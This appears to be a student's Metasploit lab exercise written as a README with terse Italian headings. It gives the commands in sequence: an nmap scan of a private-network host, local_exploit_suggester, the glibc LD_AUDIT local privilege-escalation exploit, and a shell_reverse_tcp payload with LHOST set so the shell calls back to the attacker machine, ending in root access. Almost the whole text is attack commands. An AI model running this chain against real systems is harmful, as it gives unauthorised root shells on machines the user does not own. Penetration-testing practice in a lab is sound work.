# **Metasploit pt - 3**
## **net discover**
```bash
nmap -sV -T5 192.168.1.40
```
## **avvio**
```bash
msfconsole
```
## **exploit**
```bash
search Exploit/linux/postgres-payload
```
## **avvio**
scan session exploit
```bash
use post/multi/recon/local_exploit_suggester
```
​➡️[Risultato](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit3/blob/main/Metasploit/Esercizio/3.png)

## **exploit**
```bash
use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
```

## **payload**
```bash
set payload payload/linux/x86/shell_reverse_tcp
```

## **conf payload**
```bash
set LHOST 192.168.1.25
set session 3
run
```
## **root**
➡️[Risultato](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit3/blob/main/Metasploit/Esercizio/7.png)


